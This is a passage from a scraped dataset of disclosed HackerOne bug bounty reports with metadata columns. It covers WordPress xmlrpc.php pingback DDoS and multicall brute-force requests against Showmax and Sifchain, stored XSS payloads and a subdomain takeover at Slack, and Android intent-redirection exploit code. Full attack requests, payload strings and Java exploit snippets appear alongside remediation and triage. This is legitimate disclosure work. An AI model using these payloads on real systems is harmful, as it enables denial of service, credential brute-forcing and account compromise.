ok, xmlrpc.php is enabled, let's see what are the available methods using this snippet of code in the HTTP request:

Code 88 BytesWrap lines Copy Download1<methodCall>
2<methodName>system.listMethods</methodName>
3<params></params>
4</methodCall>
HTTP Response:
Code 4.21 KiBWrap lines Copy Download1HTTP/2 200 OK
2// HTTP Response Headers
3
4<?xml version=""1.0"" encoding=""UTF-8""?>
5<methodResponse>
6  <params>
7    <param>
8      <value>
9      <array><data>
10  <value><string>system.multicall</string></value>
11  <value><string>system.listMethods</string></value>
12  <value><string>system.getCapabilities</string></value>
13  <value><string>demo.addTwoNumbers</string></value>
14  <value><string>demo.sayHello</string></value>
15  <value><string>pingback.extensions.getPingbacks</string></value>
16  <value><string>pingback.ping</string></value>
17  <value><string>mt.publishPost</string></value>
18  <value><string>mt.getTrackbackPings</string></value>
19  <value><string>mt.supportedTextFilters</string></value>
20  <value><string>mt.supportedMethods</string></value>
21  <value><string>mt.setPostCategories</string></value>
22  <value><string>mt.getPostCategories</string></value>
23  <value><string>mt.getRecentPostTitles</string></value>
24  <value><string>mt.getCategoryList</string></value>
25  <value><string>metaWeblog.getUsersBlogs</string></value>
26  <value><string>metaWeblog.deletePost</string></value>
27  <value><string>metaWeblog.newMediaObject</string></value>
28  <value><string>metaWeblog.getCategories</string></value>
29  <value><string>metaWeblog.getRecentPosts</string></value>
30  <value><string>metaWeblog.getPost</string></value>
31  <value><string>metaWeblog.editPost</string></value>
32  <value><string>metaWeblog.newPost</string></value>
33  <value><string>blogger.deletePost</string></value>
34  <value><string>blogger.editPost</string></value>
35  <value><string>blogger.newPost</string></value>
36  <value><string>blogger.getRecentPosts</string></value>
37  <value><string>blogger.getPost</string></value>
38  <value><string>blogger.getUserInfo</string></value>
39  <value><string>blogger.getUsersBlogs</string></value>
40  <value><string>wp.restoreRevision</string></value>
41  <value><string>wp.getRevisions</string></value>
42  <value><string>wp.getPostTypes</string></value>
43  <value><string>wp.getPostType</string></value>
44  <value><string>wp.getPostFormats</string></value>
45  <value><string>wp.getMediaLibrary</string></value>
46  <value><string>wp.getMediaItem</string></value>
47  <value><string>wp.getCommentStatusList</string></value>
48  <value><string>wp.newComment</string></value>
49  <value><string>wp.editComment</string></value>
50  <value><string>wp.deleteComment</string></value>
51  <value><string>wp.getComments</string></value>
52  <value><string>wp.getComment</string></value>
53  <value><string>wp.setOptions</string></value>
54  <value><string>wp.getOptions</string></value>
55  <value><string>wp.getPageTemplates</string></value>
56  <value><string>wp.getPageStatusList</string></value>
57  <value><string>wp.getPostStatusList</string></value>
58  <value><string>wp.getCommentCount</string></value>
59  <value><string>wp.deleteFile</string></value>
60  <value><string>wp.uploadFile</string></value>
61  <value><string>wp.suggestCategories</string></value>
62  <value><string>wp.deleteCategory</string></value>
63  <value><string>wp.newCategory</string></value>
64  <value><string>wp.getTags</string></value>
65  <value><string>wp.getCategories</string></value>
66  <value><string>wp.getAuthors</string></value>
67  <value><string>wp.getPageList</string></value>
68  <value><string>wp.editPage</string></value>
69  <value><string>wp.deletePage</string></value>
70  <value><string>wp.newPage</string></value>
71  <value><string>wp.getPages</string></value>
72  <value><string>wp.getPage</string></value>
73  <value><string>wp.editProfile</string></value>
74  <value><string>wp.getProfile</string></value>
75  <value><string>wp.getUsers</string></value>
76  <value><string>wp.getUser</string></value>
77  <value><string>wp.getTaxonomies</string></value>
78  <value><string>wp.getTaxonomy</string></value>
79  <value><string>wp.getTerms</string></value>
80  <value><string>wp.getTerm</string></value>
81  <value><string>wp.deleteTerm</string></value>
82  <value><string>wp.editTerm</string></value>
83  <value><string>wp.newTerm</string></value>
84  <value><string>wp.getPosts</string></value>
85  <value><string>wp.getPost</string></value>
86  <value><string>wp.deletePost</string></value>
87  <value><string>wp.editPost</string></value>
88  <value><string>wp.newPost</string></value>
89  <value><string>wp.getUsersBlogs</string></value>
90</data></array>
91      </value>
92    </param>
93  </params>
94</methodResponse>
we have pingback.ping method in the list of methods, a DDoS attack against other hosts is possible now !
Exploiting Scenario:
if you have a server for test purposes, please follow this:
let's consider https://stories.showmax.com with xmlrpc.php that's enabled, and let's consider http://YOUR-SERVER, a DDoS Attack can be achieved against http://YOUR-SERVER using this request:
Code 884 BytesWrap lines Copy Download1POST /xmlrpc.php HTTP/1.1
2Host: stories.showmax.com
3Cookie:  YOUR-COOKIE
4Cache-Control: max-age=0
5Sec-Ch-Ua: ""Chromium"";v=""91"", "" Not;A Brand"";v=""99""
6Sec-Ch-Ua-Mobile: ?0
7Upgrade-Insecure-Requests: 1
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Sec-Fetch-Site: none
11Sec-Fetch-Mode: navigate
12Sec-Fetch-User: ?1
13Sec-Fetch-Dest: document
14Accept-Encoding: gzip, deflate
15Accept-Language: en-US,en;q=0.9
16Connection: close
17Content-Length: 93
18
19
20<methodCall>
21<methodName>pingback.ping</methodName>
22<params>
23<param>
24<value><string>http://YOUR-SERVER/</string></value>
25</param>
26<param>
27<value><string>https://stories.showmax.com</string></value>
28</param>
29</params>
30</methodCall>
31

As soon as the above request is sent, the victim host (YOUR-SERVER) gets an entry in its log file with a request originating from the asecare.att.com domain verifying the pingback

This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
Remediation Action:
if xmlrpc.php isn't needed, please remove it or at least deny access to it to prevent malicious users from exploiting it
Best Regards, @mdakh404
Supporting Material/References:
References:

https://www.acunetix.com/blog/web-security-zone/wordpress-pingback-vulnerability/
https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html

Impact
https://stories.showmax.com can be added to a huge Botnet network to attack victim hosts using DDoS.aleksandr_kulik Showmax staff  closed the report and changed the status to Informative. May 31st (about 1 year ago)Hello @mdakh404,
thank you for your report. As it is stated in our policy:

Out of Scope Vulnerability Categories
...
Bruteforce Amplification Attack via https://stories.showmax.com/xmlrpc.php

We don't consider it to be an impactful vulnerability and won't fix it any time soon.
I'll close the ticket as Informative, but if you disagree or have some concerns feel free to reach out to us again.
Best regards,
Aleksmdakh404   posted a comment. May 31st (about 1 year ago)Greetings @aleksandr_kulik, but why did you accept this #991751 ?aleksandr_kulik Showmax staff  posted a comment. May 31st (about 1 year ago)Let me check with the responsible engineer about it. I'll reach you back when we have more info.mdakh404   posted a comment. May 31st (about 1 year ago)Any update @aleksandr_kulik ?aleksandr_kulik Showmax staff  reopened this report. Jun 1st (about 1 year ago)Hello @mdakh404,
we double checked it and as we found the problem was a feature in the managed hosting service, which reverted the already done fix that you've mentioned.
We fixed it back so the file won't be accessible anymore. You'll receive a reward a bit later.
We'd also like to mention that even if it shouldn't happen again, yet, in case of happening the same problem for some reason again in the future it won't be eligible for reward.
If that's ok with you, we'd like to disclose this report so it could serve as a reference in the future.
Best regards,
Aleksaleksandr_kulik Showmax staff  closed the report and changed the status to Resolved. Jun 1st (about 1 year ago)aleksandr_kulik Showmax staff  requested to disclose this report. Jun 1st (about 1 year ago)Showmax  rewarded mdakh404 with a $50 bounty. Jun 1st (about 1 year ago)mdakh404   posted a comment. Updated Jun 1st (about 1 year ago)I'm ok with the disclosure.
and i think that it's better to put a comment on #991751 and this one also that you don't accept xmlrpc.php issues anymore !mdakh404   agreed to disclose this report. Jun 1st (about 1 year ago)  This report has been disclosed. Jun 1st (about 1 year ago)mdakh404   posted a comment. Jun 1st (about 1 year ago)thanks for the bounty :)
@mdah404",https://hackerone.com/reports/1212760,Florida,United States,Vero Beach,2021,5,29,21,31
Showmax,101-250,0.0,50m-100m,$50.00,Medium,6.2,Information Disclosure,xml-rpc file open for public in the domain:https://stories.showmax.com/xmlrpc.php,kaushikkbadri  submitted a report to Showmax.Sep 26th (2 years ago),https://hackerone.com/reports/991751,Florida,United States,Vero Beach,2020,9,26,4,32
Sifchain,11-50,0.0,No value,$50.00,No value,0.0,Denial of Service,xmlrpc.php And /wp-json/wp/v2/users FILE IS enable it will used for bruteforce attack and denial of service,"a-heybati  submitted a report to Sifchain.Apr 3rd (2 years ago)Hi Team :)
i am abbas heybati ;)
Summary:
After reviewing the given scope, I realized that the main domain ""http://sifchain.finance""  has several vulnerabilities that I will report to you as a scenario. I realize that I have reported to you outside of Scope. The report is related to the mentioned company and the vulnerability can endanger your business. I consider it my duty to report this vulnerability to you.
the XML-RPC interface opens two kinds of attacks:
https://sifchain.finance/xmlrpc.php

XML-RPC pingbacks
Brute force attacks via XML-RPC

And in the  /wp-json/wp/v2/users path, it reveals all the user information

https://sifchain.finance/wp-json/wp/v2/users

Steps To Reproduce:

For the two vulnerabilities listed above in the xmlrpc.php section, first post a request to xmlrpc.php for <methodName> system.listMethods </methodName>
given

Post Request:
Code 538 BytesWrap lines Copy Download1POST /xmlrpc.php HTTP/1.1
2Host: sifchain.finance
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Connection: close
8Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
9Upgrade-Insecure-Requests: 1
10Content-Length: 135
11
12
13<?xml version=""1.0"" encoding=""utf-8""?> 
14<methodCall> 
15<methodName>system.listMethods</methodName> 
16<params></params> 
17</methodCall> 
Response:
Code 5.14 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Sat, 03 Apr 2021 05:49:32 GMT
3Content-Type: text/xml; charset=UTF-8
4Connection: close
5Strict-Transport-Security: max-age=15552000; includeSubDomains
6Vary: Accept-Encoding
7X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
8Host-Header: WordPress.com
9X-ac: 2.hhn _atomic_ams
10CF-Cache-Status: DYNAMIC
11cf-request-id: 0937e09a790000063171828000000001
12Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
13Server: cloudflare
14CF-RAY: 63a003a3fc550631-FRA
15Content-Length: 4653
16
17
18
19<?xml version=""1.0"" encoding=""UTF-8""?>
20<methodResponse>
21  <params>
22    <param>
23      <value>
24      <array><data>
25  <value><string>system.multicall</string></value>
26  <value><string>system.listMethods</string></value>
27  <value><string>system.getCapabilities</string></value>
28  <value><string>prli.api_version</string></value>
29  <value><string>prli.get_pretty_link_url</string></value>
30  <value><string>prli.get_link_from_slug</string></value>
31  <value><string>prli.get_link</string></value>
32  <value><string>prli.get_all_links</string></value>
33  <value><string>prli.get_all_groups</string></value>
34  <value><string>prli.create_pretty_link</string></value>
35  <value><string>demo.addTwoNumbers</string></value>
36  <value><string>demo.sayHello</string></value>
37  <value><string>pingback.extensions.getPingbacks</string></value>
38  <value><string>pingback.ping</string></value>
39  <value><string>mt.publishPost</string></value>
40  <value><string>mt.getTrackbackPings</string></value>
41  <value><string>mt.supportedTextFilters</string></value>
42  <value><string>mt.supportedMethods</string></value>
43  <value><string>mt.setPostCategories</string></value>
44  <value><string>mt.getPostCategories</string></value>
45  <value><string>mt.getRecentPostTitles</string></value>
46  <value><string>mt.getCategoryList</string></value>
47  <value><string>metaWeblog.getUsersBlogs</string></value>
48  <value><string>metaWeblog.deletePost</string></value>
49  <value><string>metaWeblog.newMediaObject</string></value>
50  <value><string>metaWeblog.getCategories</string></value>
51  <value><string>metaWeblog.getRecentPosts</string></value>
52  <value><string>metaWeblog.getPost</string></value>
53  <value><string>metaWeblog.editPost</string></value>
54  <value><string>metaWeblog.newPost</string></value>
55  <value><string>blogger.deletePost</string></value>
56  <value><string>blogger.editPost</string></value>
57  <value><string>blogger.newPost</string></value>
58  <value><string>blogger.getRecentPosts</string></value>
59  <value><string>blogger.getPost</string></value>
60  <value><string>blogger.getUserInfo</string></value>
61  <value><string>blogger.getUsersBlogs</string></value>
62  <value><string>wp.restoreRevision</string></value>
63  <value><string>wp.getRevisions</string></value>
64  <value><string>wp.getPostTypes</string></value>
65  <value><string>wp.getPostType</string></value>
66  <value><string>wp.getPostFormats</string></value>
67  <value><string>wp.getMediaLibrary</string></value>
68  <value><string>wp.getMediaItem</string></value>
69  <value><string>wp.getCommentStatusList</string></value>
70  <value><string>wp.newComment</string></value>
71  <value><string>wp.editComment</string></value>
72  <value><string>wp.deleteComment</string></value>
73  <value><string>wp.getComments</string></value>
74  <value><string>wp.getComment</string></value>
75  <value><string>wp.setOptions</string></value>
76  <value><string>wp.getOptions</string></value>
77  <value><string>wp.getPageTemplates</string></value>
78  <value><string>wp.getPageStatusList</string></value>
79  <value><string>wp.getPostStatusList</string></value>
80  <value><string>wp.getCommentCount</string></value>
81  <value><string>wp.deleteFile</string></value>
82  <value><string>wp.uploadFile</string></value>
83  <value><string>wp.suggestCategories</string></value>
84  <value><string>wp.deleteCategory</string></value>
85  <value><string>wp.newCategory</string></value>
86  <value><string>wp.getTags</string></value>
87  <value><string>wp.getCategories</string></value>
88  <value><string>wp.getAuthors</string></value>
89  <value><string>wp.getPageList</string></value>
90  <value><string>wp.editPage</string></value>
91  <value><string>wp.deletePage</string></value>
92  <value><string>wp.newPage</string></value>
93  <value><string>wp.getPages</string></value>
94  <value><string>wp.getPage</string></value>
95  <value><string>wp.editProfile</string></value>
96  <value><string>wp.getProfile</string></value>
97  <value><string>wp.getUsers</string></value>
98  <value><string>wp.getUser</string></value>
99  <value><string>wp.getTaxonomies</string></value>
100  <value><string>wp.getTaxonomy</string></value>
101  <value><string>wp.getTerms</string></value>
102  <value><string>wp.getTerm</string></value>
103  <value><string>wp.deleteTerm</string></value>
104  <value><string>wp.editTerm</string></value>
105  <value><string>wp.newTerm</string></value>
106  <value><string>wp.getPosts</string></value>
107  <value><string>wp.getPost</string></value>
108  <value><string>wp.deletePost</string></value>
109  <value><string>wp.editPost</string></value>
110  <value><string>wp.newPost</string></value>
111  <value><string>wp.getUsersBlogs</string></value>
112</data></array>
113      </value>
114    </param>
115  </params>
116</methodResponse>
117
2.XML-RPC pingbacks attacks
In this case, an attacker is able to leverage the default XML-RPC API in order to perform callbacks for the following purposes:

Distributed denial-of-service (DDoS) attacks - An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level).
XSPA (Cross Site Port Attack) - An attacker can execute the pingback.ping the method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.

Post Request:
Code 681 BytesWrap lines Copy Download1POST /xmlrpc.php HTTP/1.1
2Host: sifchain.finance
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Connection: close
8Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
9Upgrade-Insecure-Requests: 1
10Content-Length: 285
11
12
13
14<?xml version=""1.0"" encoding=""UTF-8""?>
15<methodCall>
16<methodName>pingback.ping</methodName>
17<params>
18<param>
19<value><string>https://your server target </string></value>
20</param>
21<param>
22<value><string>https://sifchain.finance</string></value>
23</param>
24</params>
25</methodCall>
Response:
Code 998 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Sat, 03 Apr 2021 05:58:08 GMT
3Content-Type: text/xml; charset=UTF-8
4Connection: close
5Strict-Transport-Security: max-age=15552000; includeSubDomains
6Vary: Accept-Encoding
7X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
8Host-Header: WordPress.com
9X-ac: 2.hhn _atomic_ams
10CF-Cache-Status: DYNAMIC
11cf-request-id: 0937e87a5500002b4d4c323000000001
12Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
13Server: cloudflare
14CF-RAY: 63a0103d5b352b4d-FRA
15Content-Length: 394
16
17
18<?xml version=""1.0"" encoding=""UTF-8""?>
19<methodResponse>
20  <fault>
21    <value>
22      <struct>
23        <member>
24          <name>faultCode</name>
25          <value><int>0</int></value>
26        </member>
27        <member>
28          <name>faultString</name>
29          <value><string>Invalid discovery target</string></value>
30        </member>
31      </struct>
32    </value>
33  </fault>
34</methodResponse>
3.Brute force attacks XML-RPC
Sometimes the only way to bypass request limiting or blocking in a brute force attack against WordPress site is to use the all too forgotten XML-RPC API.
In this section, we use the wp / v2 / users path that I mentioned at the beginning of the report.
Here we have found the users from the said path and use them in this section.(The user used in this section is asha8fd635db6e9, which is a report from the first section.)
""The above request can be sent in Burp Intruder (for example) with different sets of credentials. Note that, even if you guess the password or not, the response code will always be 200. ""
""WordPress XML-RPC by default allows an attacker to perform a single request, and brute force hundreds of passwords.""
Post Request:
Code 623 BytesWrap lines Copy Download1POST /xmlrpc.php HTTP/1.1
2Host: sifchain.finance
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Connection: close
8Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
9Upgrade-Insecure-Requests: 1
10Content-Length: 243
11
12
13<?xml version=""1.0"" encoding=""UTF-8""?>
14<methodCall> 
15<methodName>wp.getUsersBlogs</methodName> 
16<params> 
17<param><value>asha8fd635db6e9</value></param> 
18<param><value>password</value></param> 
19</params> 
20</methodCall>
Response:
Code 1.02 KiBWrap lines Copy Download1HTTP/1.1 403 Forbidden
2Date: Sat, 03 Apr 2021 05:51:33 GMT
3Content-Type: text/xml; charset=UTF-8
4Connection: close
5Strict-Transport-Security: max-age=15552000; includeSubDomains
6Vary: Accept-Encoding
7X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
8Host-Header: WordPress.com
9X-XMLRPC-Error-Code: 403
10X-ac: 2.hhn _atomic_ams
11CF-Cache-Status: DYNAMIC
12cf-request-id: 0937e272350000dfb7e0b9c000000001
13Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
14Server: cloudflare
15CF-RAY: 63a00696bd19dfb7-FRA
16Content-Length: 403
17
18
19
20<?xml version=""1.0"" encoding=""UTF-8""?>
21<methodResponse>
22  <fault>
23    <value>
24      <struct>
25        <member>
26          <name>faultCode</name>
27          <value><int>403</int></value>
28        </member>
29        <member>
30          <name>faultString</name>
31          <value><string>Incorrect username or password.</string></value>
32        </member>
33      </struct>
34    </value>
35  </fault>
36</methodResponse>
The following request requires permissions for both system.multicall and wp.getUsersBlogs methods:
Post Request:
Code 1.94 KiBWrap lines Copy Download1POST /xmlrpc.php HTTP/1.1
2Host: sifchain.finance
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Connection: close
8Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
9Upgrade-Insecure-Requests: 1
10Content-Length: 1592
11
12
13<?xml version=""1.0""?>
14<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
15<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
16<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
17<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
18<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>
19</data></array></value></param></params></methodCall>
Response:
Code 1.63 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Sat, 03 Apr 2021 09:47:13 GMT
3Content-Type: text/xml; charset=UTF-8
4Connection: close
5Strict-Transport-Security: max-age=15552000; includeSubDomains
6Vary: Accept-Encoding
7X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
8Host-Header: WordPress.com
9X-XMLRPC-Error-Code: 403
10X-ac: 2.hhn _atomic_ams
11CF-Cache-Status: DYNAMIC
12cf-request-id: 0938ba358200004e9daebe8000000001
13Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
14Server: cloudflare
15CF-RAY: 63a15fcf3b654e9d-FRA
16Content-Length: 1043
17
18
19<?xml version=""1.0"" encoding=""UTF-8""?>
20<methodResponse>
21  <params>
22    <param>
23      <value>
24      <array><data>
25  <value><struct>
26  <member><name>faultCode</name><value><int>403</int></value></member>
27  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
28</struct></value>
29  <value><struct>
30  <member><name>faultCode</name><value><int>403</int></value></member>
31  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
32</struct></value>
33  <value><struct>
34  <member><name>faultCode</name><value><int>403</int></value></member>
35  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
36</struct></value>
37  <value><struct>
38  <member><name>faultCode</name><value><int>403</int></value></member>
39  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
40</struct></value>
41</data></array>
42      </value>
43    </param>
44  </params>
45</methodResponse>
Supporting Material/References:
1) https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
2) https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
3)  https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
Reference Hackerone Reports: #325040 #448524 #448524 #752073
Impact
1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials
Plus, there are a lot of PoCs lying around the web concerning the vulnerabilities associated with XMLRPC.php in wordpress websites6 attachments:F1252485: Capture2.JPGF1252486: Capture.JPGF1252487: Capture3.JPGF1252488: Capture4.JPGF1252489: Capture5.JPGF1252490: poc-video.mp4",https://hackerone.com/reports/1147449,No value,No value,No value,2021,4,3,10,11
Slack,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,"""a stored xss issue in share post menu""","securitythinker  submitted a report to Slack.Jul 2nd (6 years ago)good day:
when a team mate named an xss  payload:
ex: ""><img src=x onerror=alert(1)>
""><img src=x onerror=alert(1)>
that xss payload will execute when making a post then share it, to a team that has an xss payload named.  that shared as a direct message please see screenshot 
when making post here:
https://hunter22.slack.com/files/create/space6 attachments:F102940: attackerteamate.pngF102941: owner0.pngF102942: owner3.pngF102943: owner4xsspayloadexecuted.pngF102944: ownertest.pngF102945: ownertest2.png",https://hackerone.com/reports/148848,California,United States,San Francisco,2016,7,2,10,48
Slack,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Violation of Secure Design Principles,[Screenhero] Subdomain takeover,"yassineaboukir  submitted a report to Slack.May 30th (6 years ago)Hi,
I found out some neglected DNS records that can be exploited to takedown the subdomain of Slack's acquisition feedback.screenhero.com
The security issue is that you have CNAME record that points feedback.screenhero.com to a screenhero.uservoice.com, but the problem is that the service is inactive, thus any malicious hacker would simply sign up for the service and claims the username Screenhero as his and no verification is done by the Service Provider, besides that the DNS-setup is already correctly set.
Image F97017: Capture_d_e_cran_2016-05-30_a__18.29.08.png 47.22 KiBZoom in Zoom out Copy Download
Scenario attack :
Attacker can now build a complete clone of the real site, add a login form, redirect the user, steal credentials (e.g. admin accounts), cookies and/or completely destroy business credibility for your company along with along with injecting malicious codes to steal their sensitive cookies, redirect them to malicious web pages etc.
Mitigation : To mitigate the threat you should remove CNAME DNS records for the services you don't use anymore.
Reference: http://yassineaboukir.com/blog/neglected-dns-records-exploited-to-takeover-subdomains/
Best regards.1 attachment:F97017: Capture_d_e_cran_2016-05-30_a__18.29.08.pngslacka   changed the status to Triaged. May 31st (6 years ago)
    
    
        
            
                
                
                
            
        
    
yassineaboukir   posted a comment. May 31st (6 years ago)Hello,
This issue seems to be fixed now. The subdomain is no longer accessible : https://feedback.screenhero.com/
Best regards.Slack  rewarded yassineaboukir with a $200 bounty. Jun 1st (6 years ago)slacka   closed the report and changed the status to Resolved. Jun 1st (6 years ago)We've resolved this issue, and are going to issue you a bounty!  Thanks for your report, and happy bug hunting in the future!  
Cheers,
Slack
    
    
        
            
                
                
                
            
        
    
yassineaboukir   requested to disclose this report. Dec 22nd (6 years ago)Shall we disclose, please.  This report has been disclosed. Jan 21st (6 years ago)",https://hackerone.com/reports/142096,California,United States,San Francisco,2016,5,30,17,37
Slack,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,a stored xss in  slack integration  https://onerror.slack.com/services/import,"securitythinker  submitted a report to Slack.Oct 28th (8 years ago)location of the stored xss bug :
https://hunter22.slack.com/admin/name
in team name :put this payload :""><img src=x onerror=prompt(document.domain)>
stored xss executed here:
https://hunter22.slack.com/services/import5 attachments:F19621: slack_xss.PNGF19622: slack.PNGF19623: slackx.PNGF19624: slackxss.PNGF19625: slck_xsss.PNG",https://hackerone.com/reports/33018,California,United States,San Francisco,2014,10,28,8,32
Slack,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,a stored xss issue in https://files.slack.com,"securitythinker  submitted a report to Slack.Jul 3rd (6 years ago)when making  a BoxNote snippet with this xss payload:
XSS"") ;</script> <img src=""<img src=search""/onerror=alert(document.domain)//""> ""><marquee>
when snippet made: and use the ""view raw""  xss payload will be executed
my ex: link where xss payload executed:
https://files.slack.com/files-pri/T027N7MK3-F1NCA92JF/XSS______script___img_src___img_src_search__onerror_alert__Xss__________marquee__boxnote.boxnote
that link will be executed in entire team mate  that could probably used in exploitation.3 attachments:F103044: boxnote1.pngF103045: boxnote2.pngF103046: boxnote3.png",https://hackerone.com/reports/149011,California,United States,San Francisco,2016,7,3,10,21
Slack,1001-5000,0.0,200m-1b,"$1,000.00",Critical,9.5,Privilege Escalation,Access of Android protected components via embedded intent,"bagipro  submitted a report to Slack.Jan 22nd (6 years ago)Summary by bagiproI found the following code inside com.Slack.ui.HomeActivity (exported activity, it means that any third-party app installed on the device/instant app can access it)
Code 495 Bytes1protected void onResume() {
2    // ...
3    handleIntentExtras(getIntent()); // attacker can pass anything to getIntent()
4}
5
6private void handleIntentExtras(Intent intent) {
7    // ...
8    Intent deeplinkIntent = (Intent) intent.getParcelableExtra(""extra_deep_link_intent"");
9    //  ...
10    if (!(deeplinkIntent == null || this.consumedDeeplinkIntent)) {
11        // ...
12        startActivity(deeplinkIntent); // danger! starting an intent provided by an attacker
13        // ...
14    }
15    // ...
16}
So we get that ANY protected/not exported activity can be reached.
Here is an example how it can be used against com.Slack.ui.WebViewActivity, opening arbitrary link inside WebView
Code 343 Bytes1Intent next = new Intent();
2next.setClassName(""com.Slack"", ""com.Slack.ui.WebViewActivity"");
3next.putExtra(""extra_url"", ""http://example.com/"");
4next.putExtra(""extra_title"", ""test"");
5
6Intent start = new Intent();
7start.setClassName(""com.Slack"", ""com.Slack.ui.HomeActivity"");
8start.putExtra(""extra_deep_link_intent"", next);
9
10startActivity(start);
It could be used with javascript: scheme to trigger XSS, or perform fishing attacks (because users don't see the real URL, only the title provided by the attacker)
Result:
{F154295}
Making calls to real people
Code 572 Bytes1Intent next = new Intent(""create"");
2next.setClassName(""com.Slack"", ""com.Slack.ui.CallActivity"");
3next.putExtra(""EXTRA_CALL_NAME"", ""Fake call name"");
4next.putExtra(""EXTRA_CALLER_ID"", ""U1RFBBPCP"");
5next.putExtra(""EXTRA_CHANNEL_NAME"", ""Fake channel name"");
6next.putExtra(""EXTRA_CHANNEL_ID"", ""D2B84FUFQ"");
7next.putExtra(""EXTRA_USERS_TO_INVITE"", new ArrayList<String>(Arrays.asList(new String[] { ""U2B81JBAL"" })));
8
9Intent start = new Intent();
10start.setClassName(""com.Slack"", ""com.Slack.ui.HomeActivity"");
11start.putExtra(""extra_deep_link_intent"", next);
12
13startActivity(start);
Result:
{F157904}
Was able to perform other actions too like show fake comments and content, spoof received files (with social engineering could be used to force users to download any files provided by the attacker)",https://hackerone.com/reports/200427,California,United States,San Francisco,2017,1,22,22,34
Slack,1001-5000,0.0,200m-1b,"$7,000.00",No value,0.0,Improper Authentication - Generic,Access to some Slack workspace metadata and settings available to unauthorized parties,secalert  submitted a report to Slack.Apr 12th (7 years ago),https://hackerone.com/reports/130133,California,United States,San Francisco,2016,4,12,21,16
Slack,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,an xss issue in https://hunter22.slack.com/help/requests/793043,"securitythinker  submitted a report to Slack.Feb 14th (7 years ago)good day:
i found an xss issue when making a help request..
https://hunter22.slack.com/help/requests/new
with this xss payload:
Click here
click this link
